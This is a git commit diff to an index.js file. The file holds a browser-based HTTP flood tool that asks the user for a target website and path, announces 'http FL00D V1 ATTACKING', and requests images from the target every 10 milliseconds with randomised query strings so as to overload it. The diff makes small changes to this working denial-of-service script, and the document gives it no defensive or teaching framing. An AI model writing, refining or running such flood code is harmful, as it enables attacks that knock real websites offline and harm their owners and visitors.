d1c4af187d6e1c3862f2b65df243854391741129
robloxMessage <104733450+testingtesta@users.noreply.github.com>
2022-10-22 20:42:49 -0400

    a

--- index.js
+++ index.js
@@ -1,33 +1,20 @@
 function a() {
-
-    var x = prompt("Website Here, example.com: ");
-
+    var x = prompt("Website Here: ");
 let text = "Are You Sure?\nOK or Cancel.";
 if (confirm(text) == true) {
     var a = prompt("Image Url Or /index.php, add / to the end: ");
-
 text = alert("http FL00D V1 ATTACKING : " + x);
 text = document.write("SENDING REQUESTS TO : " + x);
-
-
 function imgflood() { 
-var TARGET = x
+var TARGET = x.replace('https://','');
 var URI = a
 var pic = new Image()
-var rand = Math.floor(Math.random() * 1000)
+var rand = Math.floor(Math.random() * 5000)
 pic.src = 'http://'+TARGET+URI+rand+'=val'
 }
 setInterval(imgflood, 10)
-
-
-
 } else {
 text = "Dam";
 alert("Cancel")
 }
-
-
-
-
-
 }
